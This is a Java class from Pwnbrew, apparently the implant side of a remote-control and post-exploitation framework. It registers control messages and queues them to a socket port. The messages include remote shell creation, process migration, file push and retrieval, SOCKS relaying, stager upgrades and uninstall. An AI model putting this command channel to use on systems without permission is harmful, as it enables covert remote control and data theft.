/*

Copyright (C) 2013-2014, Securifera, Inc 

All rights reserved. 

Redistribution and use in source and binary forms, with or without modification, 
are permitted provided that the following conditions are met:

    * Redistributions of source code must retain the above copyright notice,
	this list of conditions and the following disclaimer.

    * Redistributions in binary form must reproduce the above copyright notice,
	this list of conditions and the following disclaimer in the documentation 
	and/or other materials provided with the distribution.

    * Neither the name of Securifera, Inc nor the names of its contributors may be 
	used to endorse or promote products derived from this software without specific
	prior written permission.

THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS "AS IS" AND ANY EXPRESS 
OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED WARRANTIES OF MERCHANTABILITY 
AND FITNESS FOR A PARTICULAR PURPOSE ARE DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT OWNER 
OR CONTRIBUTORS BE LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR 
CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR 
SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND ON 
ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR TORT 
(INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF THIS SOFTWARE, 
EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.

================================================================================

Pwnbrew is provided under the 3-clause BSD license above.

The copyright on this package is held by Securifera, Inc

*/


/*
 *  ControlMessageManager.java
 *
 */

package pwnbrew.network.control;

import pwnbrew.network.PortRouter;
import java.io.IOException;
import java.nio.ByteBuffer;
import java.util.Arrays;
import java.util.HashMap;
import java.util.Map;
import pwnbrew.StubConfig;
import pwnbrew.manager.PortManager;
import pwnbrew.manager.DataManager;
import pwnbrew.misc.DebugPrinter;
import pwnbrew.network.Message;
import pwnbrew.network.control.messages.*;

/**
 *
 *  
 */
public class ControlMessageManager extends DataManager {

    private static ControlMessageManager theControlManager;
    private String serverAlias = null;
    
    private static final String NAME_Class = ControlMessageManager.class.getSimpleName();    
    private static final Map<Short, String> theControlMessageMap = new HashMap();
    
       //Populate message map
    static {
        //Add message
        if( theControlMessageMap.containsKey(AddToJarLibrary.MESSAGE_ID))
            DebugPrinter.printMessage(NAME_Class, "", "ControlMessageMap already contains id" + AddToJarLibrary.MESSAGE_ID, null);
        theControlMessageMap.put(AddToJarLibrary.MESSAGE_ID, AddToJarLibrary.class.getCanonicalName());
        //Add message
        if( theControlMessageMap.containsKey(AutoSleep.MESSAGE_ID))
            DebugPrinter.printMessage(NAME_Class, "", "ControlMessageMap already contains id" + AutoSleep.MESSAGE_ID, null);
        theControlMessageMap.put(AutoSleep.MESSAGE_ID, AutoSleep.class.getCanonicalName());
        //Add message
        if( theControlMessageMap.containsKey(CancelSearch.MESSAGE_ID))
            DebugPrinter.printMessage(NAME_Class, "", "ControlMessageMap already contains id" + CancelSearch.MESSAGE_ID, null);
        theControlMessageMap.put(CancelSearch.MESSAGE_ID, CancelSearch.class.getCanonicalName());
        //Add message
        if( theControlMessageMap.containsKey(CheckInTimeMsg.MESSAGE_ID))
            DebugPrinter.printMessage(NAME_Class, "", "ControlMessageMap already contains id" + CheckInTimeMsg.MESSAGE_ID, null);
        theControlMessageMap.put(CheckInTimeMsg.MESSAGE_ID, CheckInTimeMsg.class.getCanonicalName());
        //Add message
        if( theControlMessageMap.containsKey(ClearSessions.MESSAGE_ID))
            DebugPrinter.printMessage(NAME_Class, "", "ControlMessageMap already contains id" + ClearSessions.MESSAGE_ID, null);
        theControlMessageMap.put(ClearSessions.MESSAGE_ID, ClearSessions.class.getCanonicalName());
        //Add message
        if( theControlMessageMap.containsKey(CountReply.MESSAGE_ID))
            DebugPrinter.printMessage(NAME_Class, "", "ControlMessageMap already contains id" + CountReply.MESSAGE_ID, null);
        theControlMessageMap.put(CountReply.MESSAGE_ID, CountReply.class.getCanonicalName());
        //Add message
        if( theControlMessageMap.containsKey(CreateShell.MESSAGE_ID))
            DebugPrinter.printMessage(NAME_Class, "", "ControlMessageMap already contains id" + CreateShell.MESSAGE_ID, null);
        theControlMessageMap.put(CreateShell.MESSAGE_ID, CreateShell.class.getCanonicalName());
        //Add message
        if( theControlMessageMap.containsKey(CreateShellAck.MESSAGE_ID))
            DebugPrinter.printMessage(NAME_Class, "", "ControlMessageMap already contains id" + CreateShellAck.MESSAGE_ID, null);
        theControlMessageMap.put(CreateShellAck.MESSAGE_ID, CreateShellAck.class.getCanonicalName());
        //Add message
        if( theControlMessageMap.containsKey(DeleteJarItem.MESSAGE_ID))
            DebugPrinter.printMessage(NAME_Class, "", "ControlMessageMap already contains id" + DeleteJarItem.MESSAGE_ID, null);
        theControlMessageMap.put(DeleteJarItem.MESSAGE_ID, DeleteJarItem.class.getCanonicalName());
        //Add message
        if( theControlMessageMap.containsKey(DirCount.MESSAGE_ID))
            DebugPrinter.printMessage(NAME_Class, "", "ControlMessageMap already contains id" + DirCount.MESSAGE_ID, null);
        theControlMessageMap.put(DirCount.MESSAGE_ID, DirCount.class.getCanonicalName());
        //Add message
        if( theControlMessageMap.containsKey(FileOpResult.MESSAGE_ID))
            DebugPrinter.printMessage(NAME_Class, "", "ControlMessageMap already contains id" + FileOpResult.MESSAGE_ID, null);
        theControlMessageMap.put(FileOpResult.MESSAGE_ID, FileOpResult.class.getCanonicalName());
        //Add message
        if( theControlMessageMap.containsKey(FileOperation.MESSAGE_ID))
            DebugPrinter.printMessage(NAME_Class, "", "ControlMessageMap already contains id" + FileOperation.MESSAGE_ID, null);
        theControlMessageMap.put(FileOperation.MESSAGE_ID, FileOperation.class.getCanonicalName());
        //Add message
        if( theControlMessageMap.containsKey(FileSystemMsg.MESSAGE_ID))
            DebugPrinter.printMessage(NAME_Class, "", "ControlMessageMap already contains id" + FileSystemMsg.MESSAGE_ID, null);
        theControlMessageMap.put(FileSystemMsg.MESSAGE_ID, FileSystemMsg.class.getCanonicalName());
        //Add message
        if( theControlMessageMap.containsKey(GetCheckInSchedule.MESSAGE_ID))
            DebugPrinter.printMessage(NAME_Class, "", "ControlMessageMap already contains id" + GetCheckInSchedule.MESSAGE_ID, null);
        theControlMessageMap.put(GetCheckInSchedule.MESSAGE_ID, GetCheckInSchedule.class.getCanonicalName());
        //Add message
        if( theControlMessageMap.containsKey(GetCount.MESSAGE_ID))
            DebugPrinter.printMessage(NAME_Class, "", "ControlMessageMap already contains id" + GetCount.MESSAGE_ID, null);
        theControlMessageMap.put(GetCount.MESSAGE_ID, GetCount.class.getCanonicalName());
        //Add message
        if( theControlMessageMap.containsKey(GetDrives.MESSAGE_ID))
            DebugPrinter.printMessage(NAME_Class, "", "ControlMessageMap already contains id" + GetDrives.MESSAGE_ID, null);
        theControlMessageMap.put(GetDrives.MESSAGE_ID, GetDrives.class.getCanonicalName());
        //Add message
        if( theControlMessageMap.containsKey(GetHosts.MESSAGE_ID))
            DebugPrinter.printMessage(NAME_Class, "", "ControlMessageMap already contains id" + GetHosts.MESSAGE_ID, null);
        theControlMessageMap.put(GetHosts.MESSAGE_ID, GetHosts.class.getCanonicalName());
        //Add message
        if( theControlMessageMap.containsKey(GetIPs.MESSAGE_ID))
            DebugPrinter.printMessage(NAME_Class, "", "ControlMessageMap already contains id" + GetIPs.MESSAGE_ID, null);
        theControlMessageMap.put(GetIPs.MESSAGE_ID, GetIPs.class.getCanonicalName());
        //Add message
        if( theControlMessageMap.containsKey(GetJarItemFile.MESSAGE_ID))
            DebugPrinter.printMessage(NAME_Class, "", "ControlMessageMap already contains id" + GetJarItemFile.MESSAGE_ID, null);
        theControlMessageMap.put(GetJarItemFile.MESSAGE_ID, GetJarItemFile.class.getCanonicalName());
        //Add message
        if( theControlMessageMap.containsKey(GetJarItems.MESSAGE_ID))
            DebugPrinter.printMessage(NAME_Class, "", "ControlMessageMap already contains id" + GetJarItems.MESSAGE_ID, null);
        theControlMessageMap.put(GetJarItems.MESSAGE_ID, GetJarItems.class.getCanonicalName());
        //Add message
        if( theControlMessageMap.containsKey(GetNetworkSettings.MESSAGE_ID))
            DebugPrinter.printMessage(NAME_Class, "", "ControlMessageMap already contains id" + GetNetworkSettings.MESSAGE_ID, null);
        theControlMessageMap.put(GetNetworkSettings.MESSAGE_ID, GetNetworkSettings.class.getCanonicalName());
        //Add message
        if( theControlMessageMap.containsKey(GetSessions.MESSAGE_ID))
            DebugPrinter.printMessage(NAME_Class, "", "ControlMessageMap already contains id" + GetSessions.MESSAGE_ID, null);
        theControlMessageMap.put(GetSessions.MESSAGE_ID, GetSessions.class.getCanonicalName());
        //Add message
        if( theControlMessageMap.containsKey(GetUpgradeFlag.MESSAGE_ID))
            DebugPrinter.printMessage(NAME_Class, "", "ControlMessageMap already contains id" + GetUpgradeFlag.MESSAGE_ID, null);
        theControlMessageMap.put(GetUpgradeFlag.MESSAGE_ID, GetUpgradeFlag.class.getCanonicalName());
        //Add message
        if( theControlMessageMap.containsKey(HostMsg.MESSAGE_ID))
            DebugPrinter.printMessage(NAME_Class, "", "ControlMessageMap already contains id" + HostMsg.MESSAGE_ID, null);
        theControlMessageMap.put(HostMsg.MESSAGE_ID, HostMsg.class.getCanonicalName());
        //Add message
        if( theControlMessageMap.containsKey(ImportCert.MESSAGE_ID))
            DebugPrinter.printMessage(NAME_Class, "", "ControlMessageMap already contains id" + ImportCert.MESSAGE_ID, null);
        theControlMessageMap.put(ImportCert.MESSAGE_ID, ImportCert.class.getCanonicalName());
        //Add message
        if( theControlMessageMap.containsKey(IpMsg.MESSAGE_ID))
            DebugPrinter.printMessage(NAME_Class, "", "ControlMessageMap already contains id" + IpMsg.MESSAGE_ID, null);
        theControlMessageMap.put(IpMsg.MESSAGE_ID, IpMsg.class.getCanonicalName());
        //Add message
        if( theControlMessageMap.containsKey(JarItemMsg.MESSAGE_ID))
            DebugPrinter.printMessage(NAME_Class, "", "ControlMessageMap already contains id" + JarItemMsg.MESSAGE_ID, null);
        theControlMessageMap.put(JarItemMsg.MESSAGE_ID, JarItemMsg.class.getCanonicalName());
        //Add message
        if( theControlMessageMap.containsKey(KillShell.MESSAGE_ID))
            DebugPrinter.printMessage(NAME_Class, "", "ControlMessageMap already contains id" + KillShell.MESSAGE_ID, null);
        theControlMessageMap.put(KillShell.MESSAGE_ID, KillShell.class.getCanonicalName());
        //Add message
        if( theControlMessageMap.containsKey(KillShellRelay.MESSAGE_ID))
            DebugPrinter.printMessage(NAME_Class, "", "ControlMessageMap already contains id" + KillShellRelay.MESSAGE_ID, null);
        theControlMessageMap.put(KillShellRelay.MESSAGE_ID, KillShellRelay.class.getCanonicalName());
        //Add message
        if( theControlMessageMap.containsKey(ListFiles.MESSAGE_ID))
            DebugPrinter.printMessage(NAME_Class, "", "ControlMessageMap already contains id" + ListFiles.MESSAGE_ID, null);
        theControlMessageMap.put(ListFiles.MESSAGE_ID, ListFiles.class.getCanonicalName());
        //Add message
        if( theControlMessageMap.containsKey(Migrate.MESSAGE_ID))
            DebugPrinter.printMessage(NAME_Class, "", "ControlMessageMap already contains id" + Migrate.MESSAGE_ID, null);
        theControlMessageMap.put(Migrate.MESSAGE_ID, Migrate.class.getCanonicalName());
        //Add message
        if( theControlMessageMap.containsKey(NetworkSettingsMsg.MESSAGE_ID))
            DebugPrinter.printMessage(NAME_Class, "", "ControlMessageMap already contains id" + NetworkSettingsMsg.MESSAGE_ID, null);
        theControlMessageMap.put(NetworkSettingsMsg.MESSAGE_ID, NetworkSettingsMsg.class.getCanonicalName());
        //Add message
        if( theControlMessageMap.containsKey(NoOp.MESSAGE_ID))
            DebugPrinter.printMessage(NAME_Class, "", "ControlMessageMap already contains id" + NoOp.MESSAGE_ID, null);
        theControlMessageMap.put(NoOp.MESSAGE_ID, NoOp.class.getCanonicalName());
        //Add message
        if( theControlMessageMap.containsKey(PushFile.MESSAGE_ID))
            DebugPrinter.printMessage(NAME_Class, "", "ControlMessageMap already contains id" + PushFile.MESSAGE_ID, null);
        theControlMessageMap.put(PushFile.MESSAGE_ID, PushFile.class.getCanonicalName());
        //Add message
        if( theControlMessageMap.containsKey(PushFileAbort.MESSAGE_ID))
            DebugPrinter.printMessage(NAME_Class, "", "ControlMessageMap already contains id" + PushFileAbort.MESSAGE_ID, null);
        theControlMessageMap.put(PushFileAbort.MESSAGE_ID, PushFileAbort.class.getCanonicalName());
        //Add message
        if( theControlMessageMap.containsKey(PushFileAck.MESSAGE_ID))
            DebugPrinter.printMessage(NAME_Class, "", "ControlMessageMap already contains id" + PushFileAck.MESSAGE_ID, null);
        theControlMessageMap.put(PushFileAck.MESSAGE_ID, PushFileAck.class.getCanonicalName());
        //Add message
        if( theControlMessageMap.containsKey(PushFileFin.MESSAGE_ID))
            DebugPrinter.printMessage(NAME_Class, "", "ControlMessageMap already contains id" + PushFileFin.MESSAGE_ID, null);
        theControlMessageMap.put(PushFileFin.MESSAGE_ID, PushFileFin.class.getCanonicalName());
        //Add message
        if( theControlMessageMap.containsKey(PushFileUpdate.MESSAGE_ID))
            DebugPrinter.printMessage(NAME_Class, "", "ControlMessageMap already contains id" + PushFileUpdate.MESSAGE_ID, null);
        theControlMessageMap.put(PushFileUpdate.MESSAGE_ID, PushFileUpdate.class.getCanonicalName());
        //Add message
        if( theControlMessageMap.containsKey(RelayStartRelay.MESSAGE_ID))
            DebugPrinter.printMessage(NAME_Class, "", "ControlMessageMap already contains id" + RelayStartRelay.MESSAGE_ID, null);
        theControlMessageMap.put(RelayStartRelay.MESSAGE_ID, RelayStartRelay.class.getCanonicalName());
        //Add message
        if( theControlMessageMap.containsKey(RelayStatus.MESSAGE_ID))
            DebugPrinter.printMessage(NAME_Class, "", "ControlMessageMap already contains id" + RelayStatus.MESSAGE_ID, null);
        theControlMessageMap.put(RelayStatus.MESSAGE_ID, RelayStatus.class.getCanonicalName());
        //Add message
        if( theControlMessageMap.containsKey(RelayStopRelay.MESSAGE_ID))
            DebugPrinter.printMessage(NAME_Class, "", "ControlMessageMap already contains id" + RelayStopRelay.MESSAGE_ID, null);
        theControlMessageMap.put(RelayStopRelay.MESSAGE_ID, RelayStopRelay.class.getCanonicalName());
        //Add message
        if( theControlMessageMap.containsKey(Reload.MESSAGE_ID))
            DebugPrinter.printMessage(NAME_Class, "", "ControlMessageMap already contains id" + Reload.MESSAGE_ID, null);
        theControlMessageMap.put(Reload.MESSAGE_ID, Reload.class.getCanonicalName());
        //Add message
        if( theControlMessageMap.containsKey(RemoteException.MESSAGE_ID))
            DebugPrinter.printMessage(NAME_Class, "", "ControlMessageMap already contains id" + RemoteException.MESSAGE_ID, null);
        theControlMessageMap.put(RemoteException.MESSAGE_ID, RemoteException.class.getCanonicalName());
        //Add message
        if( theControlMessageMap.containsKey(RemoveHost.MESSAGE_ID))
            DebugPrinter.printMessage(NAME_Class, "", "ControlMessageMap already contains id" + RemoveHost.MESSAGE_ID, null);
        theControlMessageMap.put(RemoveHost.MESSAGE_ID, RemoveHost.class.getCanonicalName());
        //Add message
        if( theControlMessageMap.containsKey(SessionMsg.MESSAGE_ID))
            DebugPrinter.printMessage(NAME_Class, "", "ControlMessageMap already contains id" + SessionMsg.MESSAGE_ID, null);
        theControlMessageMap.put(SessionMsg.MESSAGE_ID, SessionMsg.class.getCanonicalName());
        //Add message
        if( theControlMessageMap.containsKey(SleepRelay.MESSAGE_ID))
            DebugPrinter.printMessage(NAME_Class, "", "ControlMessageMap already contains id" + SleepRelay.MESSAGE_ID, null);
        theControlMessageMap.put(SleepRelay.MESSAGE_ID, SleepRelay.class.getCanonicalName());
        //Add message
        if( theControlMessageMap.containsKey(SocksCreateHandlerAckMsg.MESSAGE_ID))
            DebugPrinter.printMessage(NAME_Class, "", "ControlMessageMap already contains id" + SocksCreateHandlerAckMsg.MESSAGE_ID, null);
        theControlMessageMap.put(SocksCreateHandlerAckMsg.MESSAGE_ID, SocksCreateHandlerAckMsg.class.getCanonicalName());
        //Add message
        if( theControlMessageMap.containsKey(SocksCreateHandlerMsg.MESSAGE_ID))
            DebugPrinter.printMessage(NAME_Class, "", "ControlMessageMap already contains id" + SocksCreateHandlerMsg.MESSAGE_ID, null);
        theControlMessageMap.put(SocksCreateHandlerMsg.MESSAGE_ID, SocksCreateHandlerMsg.class.getCanonicalName());
        //Add message
        if( theControlMessageMap.containsKey(SocksOperation.MESSAGE_ID))
            DebugPrinter.printMessage(NAME_Class, "", "ControlMessageMap already contains id" + SocksOperation.MESSAGE_ID, null);
        theControlMessageMap.put(SocksOperation.MESSAGE_ID, SocksOperation.class.getCanonicalName());
        //Add message
        if( theControlMessageMap.containsKey(SocksOperationAck.MESSAGE_ID))
            DebugPrinter.printMessage(NAME_Class, "", "ControlMessageMap already contains id" + SocksOperationAck.MESSAGE_ID, null);
        theControlMessageMap.put(SocksOperationAck.MESSAGE_ID, SocksOperationAck.class.getCanonicalName());
        //Add message
        if( theControlMessageMap.containsKey(TaskGetFile.MESSAGE_ID))
            DebugPrinter.printMessage(NAME_Class, "", "ControlMessageMap already contains id" + TaskGetFile.MESSAGE_ID, null);
        theControlMessageMap.put(TaskGetFile.MESSAGE_ID, TaskGetFile.class.getCanonicalName());
        //Add message
        if( theControlMessageMap.containsKey(TaskProgress.MESSAGE_ID))
            DebugPrinter.printMessage(NAME_Class, "", "ControlMessageMap already contains id" + TaskProgress.MESSAGE_ID, null);
        theControlMessageMap.put(TaskProgress.MESSAGE_ID, TaskProgress.class.getCanonicalName());
        //Add message
        if( theControlMessageMap.containsKey(Uninstall.MESSAGE_ID))
            DebugPrinter.printMessage(NAME_Class, "", "ControlMessageMap already contains id" + Uninstall.MESSAGE_ID, null);
        theControlMessageMap.put(Uninstall.MESSAGE_ID, Uninstall.class.getCanonicalName());
        //Add message
        if( theControlMessageMap.containsKey(UpgradeStagerComplete.MESSAGE_ID))
            DebugPrinter.printMessage(NAME_Class, "", "ControlMessageMap already contains id" + UpgradeStagerComplete.MESSAGE_ID, null);
        theControlMessageMap.put(UpgradeStagerComplete.MESSAGE_ID, UpgradeStagerComplete.class.getCanonicalName());
        //Add message
        if( theControlMessageMap.containsKey(UpgradeStagerFlag.MESSAGE_ID))
            DebugPrinter.printMessage(NAME_Class, "", "ControlMessageMap already contains id" + UpgradeStagerFlag.MESSAGE_ID, null);
        theControlMessageMap.put(UpgradeStagerFlag.MESSAGE_ID, UpgradeStagerFlag.class.getCanonicalName());
        //Add message
        if( theControlMessageMap.containsKey(UpgradeStagerRelay.MESSAGE_ID))
            DebugPrinter.printMessage(NAME_Class, "", "ControlMessageMap already contains id" + UpgradeStagerRelay.MESSAGE_ID, null);
        theControlMessageMap.put(UpgradeStagerRelay.MESSAGE_ID, UpgradeStagerRelay.class.getCanonicalName());
        //Add message
        if( theControlMessageMap.containsKey(TaskStatus.MESSAGE_ID))
            DebugPrinter.printMessage(NAME_Class, "", "ControlMessageMap already contains id" + UpgradeStagerRelay.MESSAGE_ID, null);
        theControlMessageMap.put(TaskStatus.MESSAGE_ID, TaskStatus.class.getCanonicalName());

    
    }
    
    public static String getControlMessageClassPath( short msgId ){
        String retStr;
        synchronized(theControlMessageMap){
            retStr = theControlMessageMap.get(msgId);
        }
        return retStr;
    }
    
    //===========================================================================
    /*
     *  Constructor
     */
    private ControlMessageManager( PortManager passedCommManager ) {
        
        super(passedCommManager);        
        
        //Create the handler
        ControlMessageHandler theMessageHandler = new ControlMessageHandler( this );
        theMessageHandler.start();
       
        //Set the data handler
        setDataHandler(theMessageHandler);
    }  
    
    // ==========================================================================
    /**
     *   Creates a ControlMessageManager
     * @param passedCommManager
     * @return 
     * @throws java.io.IOException 
     */
    public synchronized static ControlMessageManager initialize( PortManager passedCommManager ) throws IOException {

        if( theControlManager == null ) {
            theControlManager = new ControlMessageManager( passedCommManager );
            createPortRouter( passedCommManager, StubConfig.getConfig().getSocketPort(), true );
        }
        
        return theControlManager;

    }/* END initialize() */
    
    // ==========================================================================
    /**
     *   Gets the ControlMessageManager
     * @return 
     */
    public synchronized static ControlMessageManager getControlMessageManager(){
        return theControlManager;
    }
    
    //===============================================================
    /**
     *   Send the message out the given channel.
     *
     * @param msgBytes
    */
    @Override
    public void handleMessage( byte[] msgBytes ) {        
        theControlManager.getDataHandler().processData(msgBytes);        
    }
    
    //===============================================================
    /**
     *   Send the message out the given channel.
     *
     * @param passedMessage
    */
    public void send( Message passedMessage ) {

        int msgLen = passedMessage.getLength();
        ByteBuffer aByteBuffer = ByteBuffer.allocate( msgLen );
        passedMessage.append(aByteBuffer);
        
        //Get the port router
        PortRouter thePR = thePortManager.getPortRouter( StubConfig.getConfig().getSocketPort() );
        
        //Queue the message to be sent
        thePR.queueSend( Arrays.copyOf( aByteBuffer.array(), aByteBuffer.position()), passedMessage.getDestHostId());
//        DebugPrinter.printMessage(NAME_Class, "Queueing " + passedMessage.getClass().getSimpleName() + " message");
        
    }
    
     //===========================================================================
    /*
     *  Returns the data handler
    */
    @Override
    public ControlMessageHandler getDataHandler() {
        return (ControlMessageHandler)theDataHandler;
    }  

      //===============================================================
    /**
     * Sets the alias for the client
     *
     * @param passedAlias
    */
    public void setServerAlias(String passedAlias) {
       serverAlias = passedAlias;
    }
    
    //===============================================================
    /**
     * Returns the alias for the client
     *
     * @return 
    */
    public String getServerAlias() {
       return serverAlias;
    }

    
}
